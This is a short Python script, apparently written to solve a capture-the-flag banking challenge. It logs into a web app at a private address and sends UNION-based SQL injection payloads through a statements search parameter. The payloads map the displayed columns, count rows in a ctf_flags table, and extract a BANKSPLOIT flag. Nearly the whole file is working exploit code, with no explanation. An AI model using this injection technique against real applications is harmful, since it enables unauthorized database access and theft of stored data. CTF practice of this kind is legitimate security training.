#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar
import re

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'email': 'alice@example.com',
        'password': 'password123'
    }).encode()

    req = urllib.request.Request(login_url, data=login_data, method='POST')
    opener.open(req, timeout=10)

    # Test 1: Which columns display?
    print("[1] Testing which columns display:")
    payload = "abc' Union select 'A','B','C','D','E','F','G'#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    for letter in ['A','B','C','D','E','F','G']:
        if letter in html:
            print(f"  Column with '{letter}': YES")

    # Test 2: Check if ctf_flags exists and has data
    print("\n[2] Checking if ctf_flags table exists:")
    payload = "abc' Union select 1,2,3,4,COUNT(*),6,7 FROM ctf_flags#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    count = re.search(r'>(\d+)<', html)
    if count:
        print(f"  Row count in ctf_flags: {count.group(1)}")
    else:
        print("  Could not determine count")

    # Test 3: Extract first flag
    print("\n[3] Extracting first flag:")
    payload = "abc' Union select 1,2,3,4,flag,6,7 FROM ctf_flags LIMIT 1#"
    statements_url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(statements_url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    # Look for any BANKSPLOIT in the HTML
    if 'BANKSPLOIT' in html:
        match = re.search(r'(BANKSPLOIT\{[A-F0-9]{12}\})', html)
        if match:
            print(f"  Flag found: {match.group(1)}")
        else:
            print("  BANKSPLOIT present but regex failed")
            snippet = re.search(r'BANKSPLOIT.{0,30}', html)
            if snippet:
                print(f"  Snippet: {snippet.group(0)}")
    else:
        print("  No BANKSPLOIT in response")
        # Try to find any data in description column
        desc = re.search(r'<td class="py-2 text-slate-200 text-sm">([^<]+)</td>', html)
        if desc:
            print(f"  Description column contains: {desc.group(1)[:100]}")

except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")
